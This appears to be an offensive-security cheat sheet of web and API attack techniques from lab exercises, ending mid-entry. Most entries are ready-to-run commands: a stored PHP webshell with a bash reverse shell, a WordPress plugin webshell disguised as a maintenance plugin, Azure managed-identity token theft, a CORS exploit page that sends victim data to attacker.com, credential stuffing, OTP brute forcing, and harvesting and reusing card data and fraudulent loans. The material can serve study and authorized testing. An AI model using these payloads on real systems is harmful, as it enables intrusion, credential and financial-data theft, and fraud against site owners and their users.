# Web – API Attacks & Stored Webshells

### Stored PHP Webshell via Unsanitized API Endpoint (HTB CPTS) [added: 2026-04]
- **Tags:** #WebShell #PHP #API #BOLA #RCE #FileUpload #CurlExploit #IDOR #PrivilegeEscalation
- **Trigger:** API endpoint accepts user-controlled content without sanitization, and export/download feature writes content to disk with attacker-controlled extension
- **Prereq:** Writable API endpoint + export/file-write functionality that preserves attacker-supplied content as executable file (e.g., .php)
- **Yields:** Remote code execution via stored PHP webshell on the web server
- **Opsec:** Med
- **Context:** API "security note" says front-end is responsible for sanitization, leaving the API endpoint unprotected. Store PHP webshell as ticket content, then export as `.php` file.
- **Payload/Method:**
```bash
# Step 1: Create account & login
curl -X POST 'http://target/auth/register' -d '{"username":"attacker","password":"Password2","email":"a@a.com"}' -H "Content-Type: application/json"
curl -X POST 'http://target/auth/login' -d '{"username":"attacker","password":"Password2"}' -H "Content-Type: application/json"
# → Returns: PHPSESSID=<TOKEN>

# Step 2: Privilege escalate via broken object-level auth – update own role
curl -X POST 'http://target/auth/update' -d '{"role":"admin"}' -H "Content-Type: application/json" -b "PHPSESSID=<TOKEN>"
# Re-login to get new token with admin role

# Step 3: Submit PHP webshell as ticket content (API doesn't sanitize)
curl -X POST 'http://target/support/add' -d '{"ticket": "<?php system($_GET[0]); ?>" }' -H "Content-Type: application/json" -b 'PHPSESSID=<TOKEN>'

# Step 4: Export ticket as .php to make it executable
curl -X POST 'http://target/support/export/<TICKET_ID>' -d '{"type":"json.php" }' -H "Content-Type: application/json" -b 'PHPSESSID=<TOKEN>'
# → Creates /exports/<ID>.json.php

# Step 5: Trigger RCE
curl 'http://target/exports/<ID>.json.php?0=id'
curl 'http://target/exports/<ID>.json.php?0=bash+-c+"bash+-i+>%26+/dev/tcp/KALI/4444+0>%261"'
```

### Git Source Code Disclosure via Open Dev Platform (HTB CPTS) [added: 2026-04]
- **Tags:** #GitExposure #SourceCodeDisclosure #Gogs #Gitea #InformationLeakage #ReconWeb #OSINT
- **Trigger:** Internal ticketing system or documentation references a dev Git platform (Gogs, Gitea, GitLab) with public repositories
- **Prereq:** Network access to the Git platform + publicly readable repositories containing application source code
- **Yields:** Internal API endpoints, authentication logic, hardcoded secrets, and attack surface mapping from source code review
- **Opsec:** Low
- **Context:** Internal ticketing system exposes a link to a dev Git platform. Source code found in repository reveals internal API endpoints and auth logic.
- **Payload/Method:**
```bash
# Found in ticket: "All devs to signup & push code to gogsusdev01.internal"
# Browse public repos on Gogs → find API project with "Security Note: front-end sanitizes input"
# This reveals the API is unprotected — proceed with API webshell technique above
```

### WordPress Admin Plugin Upload RCE [added: 2026-05]
- **Tags:** #WordPress #RCE #PluginUpload #WebShell #CMS #PHPWebShell #AdminAccess #AppService
- **Trigger:** WordPress admin credentials available (or obtained via credential spray); want arbitrary command execution on the hosting server
- **Prereq:** Valid WordPress admin credentials + plugin upload not restricted by WAF or file-type filter
- **Yields:** Arbitrary OS command execution as the web server user (e.g., nginx, www-data); can enumerate env vars, steal cloud IMDS tokens, pivot to managed identity
- **Opsec:** Med
- **Context:** WordPress plugin upload accepts .zip files containing PHP. A minimal plugin stub with `system($_GET["cmd"])` executes shell commands via HTTP GET. Especially valuable when the app runs on Azure App Service — env vars expose `IDENTITY_ENDPOINT` and `IDENTITY_HEADER` for MI token theft.
- **Payload/Method:**
  ```php
  // Save as ce.php, then zip: zip wp-maintenance.zip ce.php
  <?php
  /*
  Plugin Name: WordPress Maintanance Plugin
  Plugin URI: wordpress.org
  Description: WordPress Maintanance Plugin
  Author: WordPress
  Version: 1.0
  Author URI: wordpress.org
  */
  echo(system($_GET["cmd"]));
  ?>
  ```
  ```bash
  # Upload via WP admin: Plugins → Add New → Upload Plugin → choose .zip → Install Now → Activate

  # Verify RCE
  curl "https://<TARGET>/wp-content/plugins/wp-maintenance/wp-maintenance.php?cmd=id"

  # Dump environment (captures IDENTITY_ENDPOINT + IDENTITY_HEADER if Azure App Service)
  curl "https://<TARGET>/wp-content/plugins/wp-maintenance/wp-maintenance.php?cmd=env" | tee env_info.txt
  grep 'IDENTITY' env_info.txt

  # Steal user-assigned managed identity ARM token via IMDS (requires client_id — from az resource list)
  curl "https://<TARGET>/wp-content/plugins/wp-maintenance/wp-maintenance.php?cmd=$(python3 -c "import urllib.parse; print(urllib.parse.quote('curl -s -H \"X-Identity-Header: \$IDENTITY_HEADER\" \"\$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/&client_id=<CLIENT_ID>\"'))")"
  ```

### Client-Side Authentication Validation Bypass via Direct API [added: 2026-05]
- **Tags:** #API #AuthBypass #ClientSideValidation #EmailDomain #Registration #JavaScript #ParameterTampering #DirectAPICall
- **Trigger:** Login or registration page enforces domain/format restrictions in JavaScript (e.g., "only @corp.com emails allowed") but the API endpoint itself may lack server-side enforcement
- **Prereq:** Target web application with client-side JS validation on login/registration + API endpoint accessible directly (not filtered by WAF to known clients) + ability to call API without browser JS
- **Yields:** Authenticated session (JWT/cookie) bypassing domain restrictions — access to functionality intended only for authorized org members; often "auto-verified" account with immediate access
- **Opsec:** Low
- **Context:** Frontend JS validation is trivially bypassed by calling the API directly with curl. When developers implement email domain allowlists only in the JavaScript layer (not server-side), any email address registers successfully. Look for registration endpoints in OpenAPI docs or via ffuf. Test with arbitrary email domains. Response messages like "Account auto-verified for immediate access" indicate server-side validation is absent.
- **Payload/Method:**
  ```bash
  # Step 1 — Register directly via API (bypass JS domain restriction)
  curl -s -X POST "https://target.com/api/auth/register" \
    -H "Content-Type: application/json" \
    -d '{"email":"attacker@gmail.com","password":"Test@1234!"}' | jq .

  # Step 2 — Login and capture session token
  curl -s -X POST "https://target.com/api/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"attacker@gmail.com","password":"Test@1234!"}' \
    -c cookies.txt -v 2>&1 | grep -i "set-cookie\|token\|session"

  # Step 3 — Use captured token on restricted endpoints
  curl -s "https://target.com/api/admin/users" \
    -H "Authorization: Bearer $TOKEN" | jq .

  # Test variations: try form-encoded instead of JSON, try username instead of email
  curl -s -X POST "https://target.com/api/auth/register" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d 'email=attacker@gmail.com&password=Test@1234!'
  ```

### Credential Extraction from Git Commit History (Bitbucket/GitHub/GitLab) [added: 2026-05]
- **Tags:** #GitExposure #CredentialExtraction #CommitHistory #Bitbucket #GitHub #GitLab #HardcodedSecrets #GitLog #SourceCodeDisclosure
- **Trigger:** Discovered public or internally-accessible Git repository (Bitbucket, GitHub, GitLab) containing application or infrastructure code; target using git-based version control
- **Prereq:** Public or readable access to repository + ability to clone or browse history + git client installed; repositories with unredacted commit history
- **Yields:** Hardcoded AWS keys, API credentials, passwords, database credentials, and OAuth tokens from historical commits; AWS account ID enumeration from key format
- **Opsec:** Low
- **Context:** Developers frequently commit credentials and then remove them, but the unencrypted values remain in git history. Automated scanning tools like `git log` and `trufflehog` can extract all historical secrets from public or leaked repositories. Even if credentials are later revoked, the commit history reveals developer practices, account structure, and service relationships.
- **Payload/Method:**
  ```bash
  # Step 1 — Clone target repository (or git clone over HTTPS if public)
  git clone https://<GIT_HOST>/<ORG>/<REPO>.git
  cd <REPO>
  
  # Step 2 — Search git history for obvious credential patterns
  git log --all --pretty=format:%H | head -20
  git show <commit_hash>  # inspect specific commit for hardcoded secrets
  
  # Step 3 — Use trufflehog to scan entire history for secret patterns
  trufflehog filesystem . --no-update --json
  
  # Step 4 — Grep for common secret keywords in all commits
  git log -S 'AKIA' --all --source --remotes  # search for AWS key format (AKIA*)
  git log -S 'password' --all -p              # show all commits containing 'password'
  git log -S 'secret' --all -p                # show all commits containing 'secret'
  
  # Step 5 — Extract specific credential from commit
  git show <commit_hash>:<file_path>  # display file content at that commit
  # Example: git show <COMMIT_HASH>:<path/to/secrets_file>
  
  # Step 6 — Enumerate AWS account ID from extracted key
  # AWS keys format: AKIA<20 random chars> identifies account and service
  # Extract key and use for downstream enumeration (s3, secretsmanager, sts commands)
  aws configure --profile leaked
  aws sts get-access-key-info --access-key-id AKIA... --profile leaked
  ```

### Sequential ID Enumeration (BOLA via Parameter Fuzzing) [added: 2026-05]
- **Tags:** #BOLA #IDOR #SequentialID #API #Enumeration #ParameterFuzzing #AccessControl #Unauthenticated
- **Trigger:** REST API endpoint with numeric ID parameter (e.g., `/api/user/5`, `/api/profile/{id}`) — testing with different IDs reveals data without authorization checks
- **Prereq:** Access to an API endpoint accepting numeric ID in path or query parameter + endpoint returns user/object data
- **Yields:** Unauthorized access to other users' sensitive data (profiles, PII, settings); complete data enumeration if IDs are predictable
- **Opsec:** Low
- **Context:** Broken Object Level Authorization (OWASP API1) occurs when developers assume sequential IDs are a form of security. Change the ID parameter to enumerate all accessible objects. Start with ID 1 (often admin) and increment from there.
- **Payload/Method:**
```bash
# Step 1 — Identify ID parameter structure (numeric path param, query param, or JSON body)
curl 'http://target/api/user/5'
curl 'http://target/api/user?id=5'
curl -X GET 'http://target/api/profile' -d '{"user_id": 5}'

# Step 2 — Test ID 1 (often admin or highest privilege)
curl 'http://target/api/user/1' | jq .

# Step 3 — Enumerate all IDs (if response gives user count, automate the range)
for i in {1..100}; do
  echo "=== ID $i ==="
  curl -s "http://target/api/user/$i" | jq . | head -5
done

# Step 4 — Extract sensitive fields (email, role, phone, internal ID, reset token if present)
curl -s "http://target/api/user/1" | jq '.email, .role, .phone, .internal_id'

# Alternative: Use ffuf for faster enumeration
ffuf -w <(seq 1 1000) -u 'http://target/api/user/FUZZ' \
  -mr '"email"' -v | grep -i "200\|email"
```

### Credential Stuffing via Intruder / ffuf Pitchfork [added: 2026-05]
- **Tags:** #CredentialStuffing #BruteForce #Authentication #Intruder #ffuf #PasswordSpray #CommonCredentials
- **Trigger:** Login endpoint accepting email + password; no rate limiting or weak rate limit (Burp can detect when limits reset per IP, per session, or per user)
- **Prereq:** Wordlist of emails or usernames + wordlist of passwords + ability to send many requests in parallel (ffuf or Burp Intruder)
- **Yields:** Valid credentials for one or more user accounts; authenticated session to access user data and functions
- **Opsec:** Med
- **Context:** OWASP API2 (Broken Authentication). Many applications lack rate limiting on login endpoints or allow unlimited attempts. Credential stuffing combines common email formats with simple passwords. ffuf with Pitchfork mode is faster than Burp Community Intruder (which throttles).
- **Payload/Method:**
```bash
# Step 1 — Prepare wordlists
cut -d "," -f 1 breached_creds.csv > emails.txt
cut -d "," -f 2 breached_creds.csv > passwords.txt
# OR use common wordlists:
# Emails: admin@target.com, user@target.com, test@target.com, firstname.lastname@target.com
# Passwords: P@ssw0rd, Password123, Qwerty123, Admin123

# Step 2 — ffuf Pitchfork attack (paired email + password, one-to-one)
ffuf -w ~/wordlists/emails.txt:FUZZ1 \
     -w ~/wordlists/passwords.txt:FUZZ2 \
     -X POST \
     -d '{"email":"FUZZ1","password":"FUZZ2"}' \
     -H "Content-Type: application/json" \
     -u http://target/api/user/login \
     -mc 200 -mode pitchfork -s

# Step 3 — Extract and verify successful logins
# ffuf with -mode pitchfork will show response code 200 for matches
# Capture Authorization header or session cookie from 200 response

# Step 4 — Use captured token
curl -s -H "Authorization: Bearer $TOKEN" http://target/api/user/profile | jq .

# Alternative: Burp Intruder
# 1. Send login request to Repeater
# 2. Intruder → Positions: mark email and password values as payload markers (§)
# 3. Payloads: Pitchfork mode, set both to Custom file (emails.txt and passwords.txt)
# 4. Run attack, filter for 200 responses
```

### Rate Limiting Bypass via OTP Enumeration [added: 2026-05]
- **Tags:** #RateLimitBypass #OTP #BruteForce #2FA #SuspendedToken #API4 #PasswordReset
- **Trigger:** Login or password reset endpoint returns a 4-digit or 6-digit OTP; application enforces rate limiting but uses suspendable/resetable tokens or per-request rate limiting
- **Prereq:** OTP verification endpoint (e.g., POST /api/otp/verify) + ability to generate sufficient OTP payloads (seq or python range) + ffuf or Burp Intruder
- **Yields:** 2FA bypass; full account takeover if OTP can be brute-forced before timeout; account reset completion
- **Opsec:** Med
- **Context:** OWASP API4 (Rate Limiting Bypass). Applications often implement global rate limits but allow multiple requests with different OTP values from the same IP/session. If OTP lifetime is long (2-5 min) or there is no per-IP cumulative limit, all 10,000 combinations (0000-9999) can be tested.
- **Payload/Method:**
```bash
# Step 1 — Trigger OTP (e.g., login → 2FA → OTP sent to email/SMS)
# Capture the request that expects OTP validation:
curl -X POST 'http://target/api/otp/verify' \
  -H "Content-Type: application/json" \
  -d '{"otp":"0000"}' \
  -b 'session_token=<SESSION_TOKEN>'
# Response: {"status":"error","message":"Invalid OTP"}

# Step 2 — Generate OTP wordlist (4-digit: 0000-9999)
python3 -c "print('\n'.join(f'{i:04d}' for i in range(10000)))" > otp_4digit.txt
# Result: 0000, 0001, 0002, ..., 9999

# Step 3 — ffuf brute force OTP (faster than Burp Community)
ffuf -w otp_4digit.txt:FUZZ \
     -X POST \
     -d '{"otp":"FUZZ"}' \
     -H "Content-Type: application/json" \
     -u http://target/api/otp/verify \
     -b 'session_token=<SESSION_TOKEN>' \
     -mc 200 -s

# Step 4 — Alternative: Burp Intruder (Sniper)
# 1. Repeater → send OTP request with dummy value (0000)
# 2. Intruder → Positions: set OTP value as payload marker (§0000§)
# 3. Payloads → Payload type: Numbers
# 4. Options: From 0 to 9999, Step 1, Sequential
# 5. Run attack, look for 200 status or changed response size

# Step 5 — Extract valid OTP and continue authentication
OTP_FOUND=<otp_from_ffuf_results>
curl -X POST 'http://target/api/otp/verify' \
  -H "Content-Type: application/json" \
  -d "{\"otp\":\"$OTP_FOUND\"}" \
  -b 'session_token=<SESSION_TOKEN>' \
  -c cookies.txt
# → Returns: {"status":"success","token":"<NEW_AUTH_TOKEN>"}
```

### CORS Misconfiguration Exploitation [added: 2026-05]
- **Tags:** #CORS #MisConfig #AccessControl #XSS #Credentials #CrossOrigin #OWASP
- **Trigger:** API response includes both `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true` (invalid/dangerous combination); or `Access-Control-Allow-Origin` echoes arbitrary Origin header without validation
- **Prereq:** API endpoint with CORS headers + ability to add custom Origin header via curl or browser + API returns sensitive data
- **Yields:** Unauthorized access to API endpoints from attacker-controlled domain; XSS + credential theft if victim visits attacker page
- **Opsec:** Low
- **Context:** CORS misconfiguration allows attacker-controlled JavaScript (hosted on attacker.com) to read responses from the vulnerable API when a victim user visits attacker.com. Especially dangerous when combined with stored XSS or via malicious email link. If `Access-Control-Allow-Credentials: true` is set with `*` origin, browser will include cookies automatically.
- **Payload/Method:**
```bash
# Step 1 — Identify API endpoint and intercept response to see CORS headers
curl -v 'http://target/api/user/profile' -H "Authorization: Bearer $TOKEN"
# Response headers:
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true
# ^ Dangerous combination

# Step 2 — Confirm CORS bypass by adding Origin header
curl -v 'http://target/api/user/profile' \
  -H "Origin: http://attacker.com" \
  -H "Authorization: Bearer $TOKEN"
# Response still returns 200 with data

# Step 3 — Create malicious HTML page (hosted on attacker.com)
cat > /tmp/cors_exploit.html << 'CORS'
<!DOCTYPE html>
<html>
<head>
<title>Loading...</title>
</head>
<body>
<h1>Please wait, authenticating...</h1>
<script>
  fetch('http://target/api/user/profile', {
    method: 'GET',
    credentials: 'include',
    headers: {
      'Authorization': 'Bearer ' + localStorage.getItem('auth_token')
    }
  })
  .then(r => r.json())
  .then(data => {
    fetch('http://attacker.com/steal?data=' + encodeURIComponent(JSON.stringify(data)));
  })
  .catch(e => console.log('Error: ', e));
</script>
</body>
</html>
CORS

# Step 4 — Deliver link to victim via email/phishing
# Victim logs into target.com, then visits attacker.com/cors_exploit.html
# JavaScript runs in victim's browser with their auth context
# Sensitive data is exfiltrated to attacker.com

# Step 5 — Receive exfiltrated data
# Access http://attacker.com/steal?data=<JSON> in logs/access_log
```

### Version Downgrade Attack (Legacy API Endpoint) [added: 2026-05]
- **Tags:** #VersionDowngrade #LegacyEndpoint #RateLimitBypass #BruteForce #API9 #SecurityControl
- **Trigger:** Current API version enforces security controls (rate limiting, MFA, input validation); older version or legacy endpoint exists at same functionality path but lacks controls
- **Prereq:** Multiple API versions in URL path or available endpoints (e.g., `/api/v1/login` vs `/api/v2/login`) + ability to modify URL path + knowledge that older version lacks specific controls
- **Yields:** Bypass rate limiting, MFA, or other controls by exploiting unpatched legacy endpoint; full account takeover via brute force on v1 if v2 is rate-limited
- **Opsec:** Med
- **Context:** OWASP API9 (Improper Asset Management). Developers often maintain legacy API versions for backwards compatibility but fail to apply security patches to older versions. Rate limiting added to v2 does not automatically apply to v1. This is especially dangerous in microservices architectures where version endpoints are load-balanced separately.
- **Payload/Method:**
```bash
# Step 1 — Enumerate available API versions (try common patterns)
for v in v1 v2 v3 v1.0 v1.1 v2.0; do
  echo "Testing /api/$v/user/login"
  curl -s -o /dev/null -w "Status: %{http_code}\n" -X POST \
    "http://target/api/$v/user/login" \
    -d '{"username":"test","password":"test"}' \
    -H "Content-Type: application/json"
done

# Step 2 — Identify rate limit differences (check v2 vs v1)
# v2 (rate limited):
for i in {1..10}; do
  curl -s -X POST "http://target/api/v2/user/login" \
    -d '{"username":"<TARGET_USER>","pin":"0000"}' \
    -H "Content-Type: application/json" | jq '.status'
done
# Output: success, success, success, success, success, error (too many attempts)

# v1 (unprotected):
for i in {1..1000}; do
  curl -s -X POST "http://target/api/v1/user/login" \
    -d '{"username":"<TARGET_USER>","pin":"0000"}' \
    -H "Content-Type: application/json" | jq '.status'
done | sort | uniq -c
# Output: 999x error (invalid pin), 1x success (found valid pin)

# Step 3 — ffuf brute force on legacy endpoint (no rate limit)
ffuf -w ~/wordlists/pin.txt:FUZZ \
     -X POST \
     -d '{"username":"<TARGET_USER>","pin":"FUZZ"}' \
     -H "Content-Type: application/json" \
     -u http://target/api/v1/user/login \
     -fs 0 -s

# Step 4 — Extract successful login (different response size/pattern)
# Capture the valid PIN and use for account takeover
```

### Broken Function Level Authorization via FFUF Endpoint Fuzzing [added: 2026-05]
- **Tags:** #BFLA #FFUF #Enumeration #EndpointDiscovery #AdminBypass #APIFuzzing #AccessControl
- **Trigger:** Discovered API with bearer token auth; looking for undocumented or admin-only endpoints that unprivileged users can access
- **Prereq:** Valid JWT/auth token (low-privilege user) + FFUF + small wordlist (raft-small-directories.txt) + API base path known
- **Yields:** Discovery of hidden admin endpoints; unauthorized admin data access as unprivileged user
- **Opsec:** Med
- **Context:** Many APIs expose admin endpoints without proper authorization checks. Developers may disable CORS preflight or not enforce privilege level checks on specific routes. Fuzzing discovers these in seconds.
- **Payload/Method:**
```bash
# Step 1 — Generate endpoint list with ffuf using common admin/debug paths
ffuf -u http://target/api/FUZZ \
  -w /usr/share/wordlists/raft-small-directories.txt \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200 -s

# Typically finds:
# - /api/admin
# - /api/debug
# - /api/v1/internal
# - /api/settings
# - /api/users (if not already known)

# Step 2 — Access discovered admin endpoint
curl -H "Authorization: Bearer $TOKEN" http://target/api/admin | jq .

# Step 3 — Extract sensitive data (user list, config, flags)
curl -H "Authorization: Bearer $TOKEN" http://target/api/admin/users | jq '.[] | {username, email, role}'
```

### Brute Force Authentication via Credential Hints from User Posts [added: 2026-05]
- **Tags:** #BruteForce #WeakPassword #CredentialExtraction #Intruder #UserContent #AuthBypass
- **Trigger:** Unprivileged account access; user profiles or blog posts contain hints about passwords (pet names, dates, favorite things)
- **Prereq:** Identified target user(s) + low-privilege account access to view user posts/profiles + extracted password hints/patterns
- **Yields:** Valid credentials for target user; complete account takeover
- **Opsec:** High
- **Context:** Users often derive passwords from personal details visible in their public profiles. Look for mentions of pets, cities, hobbies, dates in bios, blog posts, or comments. Combine hints into a targeted wordlist and brute force login. Pattern: `<hint>`, `<Hint>`, `<hint>123`, `<hint><year>`.
- **Payload/Method:**
```bash
# Step 1 — Enumerate users and extract profile/post hints
curl -s "http://target/api/users" -H "Authorization: Bearer $TOKEN" | jq '.[] | {username, bio, posts}'

# Example hints found in posts:
# - "love my dog <petname>" → <petname>, <Petname>, <petname>123, <petname><year>
# - "moved to <city> last year" → <city>, <City>, <City><year>
# - "born in <year>" → <year>, <year>!, <year>123

# Step 2 — Create wordlist from hints
cat > wordlist.txt << 'LIST'
<hint1>
<Hint1>
<hint1>123
<hint1><year>
<hint2>
<Hint2>
<hint2><year>
LIST

# Step 3 — Burp Intruder Sniper attack
# 1. Capture login request: POST /api/login {"username":"<TARGET_USER>","password":"test"}
# 2. Send to Intruder
# 3. Positions: Set password value as payload marker (§test§)
# 4. Payloads: Custom file → upload wordlist.txt
# 5. Run attack, look for 200 status or different response size

# Step 4 — ffuf alternative (faster)
ffuf -w wordlist.txt:FUZZ \
     -X POST \
     -d '{"username":"<TARGET_USER>","password":"FUZZ"}' \
     -H "Content-Type: application/json" \
     -u http://target/api/login \
     -mc 200 -s

# Step 5 — Extract session/token
TOKEN=$(curl -s -X POST http://target/api/login \
  -d '{"username":"<TARGET_USER>","password":"<FOUND_PASSWORD>"}' \
  -H "Content-Type: application/json" | jq -r '.token')
```

### Excessive Data Exposure → Sensitive Field Harvesting via Intruder [added: 2026-05]
- **Tags:** #DataExposure #IDOR #CredentialHarvesting #CreditCard #PaymentFraud #Intruder #DataExtraction
- **Trigger:** Profile or payment endpoint returns sensitive data (credit card info) for any user ID; no authorization check on data retrieval
- **Prereq:** Known or guessed username list + authenticated session + payment/profile endpoint returning CC data + Burp Intruder
- **Yields:** Extracted credit card data (name, number, CVC, expiry); ability to perform unauthorized purchases on victims' cards
- **Opsec:** High
- **Context:** Excessive data exposure (OWASP API3) combined with IDOR allows harvesting all users' payment information. Once extracted, CCs can be used in the Purchase endpoint to bill unauthorized transactions.
- **Payload/Method:**
```bash
# Step 1 — Confirm data exposure on Profile endpoint
curl -s "http://target/api/profile/<USERNAME>" \
  -H "Authorization: Bearer $TOKEN" | jq .
# Check response for sensitive fields: cardNumber, cardCvc, cardExpiry, SSN, phone, etc.

# Step 2 — Enumerate all usernames (from user list endpoint or fuzzing)
curl -s "http://target/api/users" -H "Authorization: Bearer $TOKEN" | jq '.[] | .username' > usernames.txt

# Step 3 — Burp Intruder Sniper attack to extract all sensitive records
# 1. Send: GET /api/profile/<USERNAME>
# 2. Intruder → Positions: mark username as payload (§<USERNAME>§)
# 3. Payloads: Custom file → usernames.txt
# 4. Run attack, look for 200 responses
# 5. Export results, grep for sensitive field name

# Step 4 — ffuf alternative (parallel enumeration)
ffuf -w usernames.txt:FUZZ \
     -u "http://target/api/profile/FUZZ" \
     -H "Authorization: Bearer $TOKEN" \
     -mc 200 -v | grep "<sensitive_field>"

# Step 5 — Extract and harvest all records
for user in $(cat usernames.txt); do
  curl -s "http://target/api/profile/$user" \
    -H "Authorization: Bearer $TOKEN" | \
    jq '{username, cardName, cardNumber, cardCvc, cardExpiry}' >> harvested_data.json
done

# Step 6 — Use harvested data in downstream endpoint (e.g., purchase with victim CC)
curl -X POST "http://target/api/purchase" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "productId": "<PRODUCT_ID>",
    "quantity": 1,
    "cardName": "<VICTIM_CARD_NAME>",
    "cardNumber": "<VICTIM_CARD_NUMBER>",
    "cardCvc": "<VICTIM_CVC>",
    "cardExpiry": "<VICTIM_EXPIRY>"
  }'
```

### Improper Asset Management (Version Enumeration) [added: 2026-05]
- **Tags:** #VersionEnum #APIVersions #LegacyEndpoint #AssetManagement #OWASP9 #SecurityControl #Bypass
- **Trigger:** API endpoints with version prefixes in path (e.g., `/api/v2/endpoint`); suspicion that older versions may lack security controls
- **Prereq:** Known API version (e.g., v2) + access to endpoint
- **Yields:** Discovery of accessible retired API versions with weaker or no security controls; ability to bypass current version's protections
- **Opsec:** Low
- **Context:** Developers publish newer API versions with security controls (rate limiting, MFA) but leave older versions running for backwards compatibility without patching them. Always test v1, v3, dev, test, demo, alpha, beta, stage versions.
- **Payload/Method:**
```bash
# Step 1 — Identify current version in use
curl -v http://target/api/v2/users/login
# Response header: API-Version: v2

# Step 2 — Test alternative versions for existence and features
for version in v1 v3 dev test demo alpha beta stage; do
  echo "Testing /api/$version/users/login"
  curl -s -o /dev/null -w "Status: %{http_code}\n" \
    -X POST "http://target/api/$version/users/login" \
    -d '{"username":"test","password":"test"}' \
    -H "Content-Type: application/json"
done

# Step 3 — Compare security controls between versions
# v2 (current — rate limited):
for i in {1..6}; do
  curl -s -X POST "http://target/api/v2/users/login" \
    -d '{"username":"admin","password":"test'$i'"}' \
    -H "Content-Type: application/json" | jq '.status'
done
# Result: success, success, success, success, success, error (too many attempts)

# v1 (legacy — unprotected):
for i in {1..100}; do
  curl -s -X POST "http://target/api/v1/users/login" \
    -d '{"username":"admin","password":"test'$i'"}' \
    -H "Content-Type: application/json" | jq '.status'
done | sort | uniq -c
# Result: 99x error, 1x success → unlimited attempts allowed on v1
```

### Unauthenticated Redis Access via Misconfigured Service [added: 2026-05]
- **Tags:** #Redis #SecurityMisconfig #Unauthenticated #DataStore #ServiceDiscovery #InformationDisclosure
- **Trigger:** Nmap reveals open Redis port (6379) on target; no authentication required to connect
- **Prereq:** Network access to Redis port 6379 + redis-cli installed + target runs Redis without AUTH requirement
- **Yields:** Direct access to in-memory database; extraction of secrets, session tokens, cached credentials, flags
- **Opsec:** Low
- **Context:** Redis is often misconfigured with default settings (no requirepass). If exposed on the network, an attacker can read all cached data including sessions, API keys, and sensitive application state.
- **Payload/Method:**
```bash
# Step 1 — Discover Redis service via Nmap
nmap -sC -sV -p- TARGET_IP | grep -i redis
# Output: 6379/tcp open  redis        Redis key-value store

# Step 2 — Connect to Redis without authentication
redis-cli -h TARGET_IP -p 6379

# Step 3 — Enumerate keys in the database
keys *
# Output: flag, user_sessions:*, cached_creds, api_keys, ...

# Step 4 — Extract sensitive data
get flag
# Output: flag{...}

get user_sessions:admin
# Output: auth_token=eyJhbGc...

mget cached_creds:*
# Output: list of credentials

hgetall api_keys
# Output: key_name → secret_key pairs

# Step 5 — Script full database dump
(
  echo "KEYS *"
  echo "command DOCS"
) | redis-cli -h <TARGET_IP> -p 6379 > redis_dump.txt
```

### Unauthenticated API User Enumeration + Financial Data Leak via FFUF [added: 2026-05]
- **Tags:** #BOLA #UserEnumeration #FFUF #AccountTakeover #Unauthenticated #FinancialData #IDOR #Wordlist
- **Trigger:** REST API with sequential numeric user IDs (e.g., /api/users/<id>); no authentication required; FFUF can be used to brute-force ID range
- **Prereq:** Unauthenticated endpoint with numeric ID parameter; wordlist of potential user IDs (e.g., 100–1000)
- **Yields:** Leaked user accounts, transaction records, loan histories, personal financial data
- **Opsec:** Low (noisy enumeration, leaves audit logs)
- **Context:** Financial/banking APIs frequently store rich user objects at `/api/users/<id>` with no auth requirement. Numeric IDs are predictable; enumeration with ffuf returns full account records including loan and balance data.
- **Payload/Method:**
```bash
# Step 1: Generate wordlist of user IDs
seq 100 1000 > user_ids.txt

# Step 2: FFUF enumeration targeting /api/users endpoint
ffuf -w user_ids.txt -u 'http://target/api/users/FUZZ' -H "Content-Type: application/json" -mc 200 -o results.json

# Step 3: Filter results (200 responses = valid users)
cat results.json | jq '.results[] | select(.status==200) | .input'

# Step 4: Extract full user records
for id in $(seq 100 1000); do
  curl -s "http://target/api/users/$id" | jq . >> users_dump.json
done

# Step 5: Parse loan history from extracted records
cat users_dump.json | jq '.[] | {id: .id, name: .name, loans: .loans, balance: .balance}'
```

### Unauthenticated Account Takeover via BOLA + Account Update Endpoint [added: 2026-05]
- **Tags:** #BOLA #IDOR #AccountTakeover #FinancialFraud #UnrestrictedAccess #LoanExploit #Unauthenticated
- **Trigger:** Enumerated user IDs from prior BOLA attack; account update endpoint accessible without auth
- **Prereq:** Valid user ID from enumeration; account update endpoint (e.g., `/api/users/<id>/account`) accepts changes without authentication
- **Yields:** Full account takeover, ability to modify loans, transfer funds, change account settings
- **Opsec:** High (destructive, leaves transaction audit trail)
- **Context:** After enumerating user IDs, account modification endpoints (password reset, email change) may lack authentication checks entirely. Override the victim's password, then authenticate as them for full access.
- **Payload/Method:**
```bash
# Step 1: Target user ID (from prior FFUF enumeration)
TARGET_ID=<ID_FROM_ENUM>

# Step 2: Retrieve current account details
curl -s "http://target/api/users/$TARGET_ID/account" | jq .

# Step 3: Update password to attacker-controlled value
curl -X POST "http://target/api/users/$TARGET_ID/account/update" \
  -H "Content-Type: application/json" \
  -d '{"password": "<NEW_PASSWORD>", "email": "<ATTACKER_EMAIL>"}'

# Step 4: Login with new credentials
curl -X POST "http://target/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "<TARGET_USERNAME>", "password": "<NEW_PASSWORD>"}' \
  -c cookies.txt

# Step 5: Access loan endpoint authenticated
curl -s "http://target/api/loans" -b cookies.txt | jq .

# Step 6: Request new loan (unrestricted)
curl -X POST "http://target/api/loans/request" \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"amount": 50000, "term": 60}'
```

### Unrestricted Loan Request Creation (No Server-Side Validation) [added: 2026-05]
- **Tags:** #BOLA #BrokenAccessControl #FinancialFraud #MoneyTransfer #UnrestrictedResource #LoanExploit
- **Trigger:** Authenticated access to loan endpoint (from account takeover); loan amount accepted without backend validation
- **Prereq:** Valid authenticated session; logged-in as compromised user
- **Yields:** Arbitrary loan amounts requested and potentially approved; financial fraud / theft
- **Opsec:** High (transaction audit trail, bank records)
- **Context:** When `/api/loans/request` lacks backend risk assessment or amount validation, any authenticated user can request arbitrarily large loans. Server trusts the client-supplied amount without cross-checking against account history or creditworthiness.
- **Payload/Method:**
```bash
# Step 1: Login to hijacked account (session in cookies.txt from prior step)

# Step 2: Request loan for arbitrary high amount (e.g., $999,999)
curl -X POST "http://target/api/loans/request" \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "amount": 999999,
    "term": 60,
